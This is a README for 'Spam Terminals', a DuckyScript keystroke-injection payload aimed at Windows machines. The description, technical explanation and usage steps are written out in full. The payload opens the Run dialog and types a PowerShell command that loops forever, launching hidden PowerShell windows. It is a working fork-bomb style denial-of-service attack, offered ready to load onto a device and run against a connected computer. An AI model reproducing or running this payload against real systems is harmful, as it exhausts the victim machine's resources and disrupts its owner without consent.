# Spam Terminals - By bst04

<div align=center>

<img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/logo-repository-2_0.gif" width="600" /><br><img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

This script, created by bst04, is designed to work on Windows devices. It opens an infinite number of hidden PowerShell terminals, effectively spamming the system with terminal instances.


## Technical Explanation

1. **Initialization**:
    - `GUI r`: Simulates pressing "Windows" + "R" to open the Run dialog.
    - `DELAY 250`: Waits for 0.25 seconds to ensure the Run dialog is open.

2. **Execute PowerShell Command**:
    - `STRING powershell -WindowStyle Hidden -Command "while ($true) { Start-Process powershell -ArgumentList '-NoExit', '-Command', 'Start-Process powershell -WindowStyle Hidden -ArgumentList \"-NoExit\", \"-Command\", \"Start-Process powershell -WindowStyle Hidden\"' }"`: Types a PowerShell command that runs an infinite loop, continuously opening hidden PowerShell windows.
    - `DELAY 1000`: Waits for 1 second to ensure the command is fully typed.

3. **Start the Command**:
    - `ENTER`: Executes the PowerShell command.

---

## Usage

1. Copy the payload script to your DuckyScript-enabled device.
2. Ensure the device is connected to a Windows system.
3. Execute the payload to open an infinite number of hidden PowerShell terminals.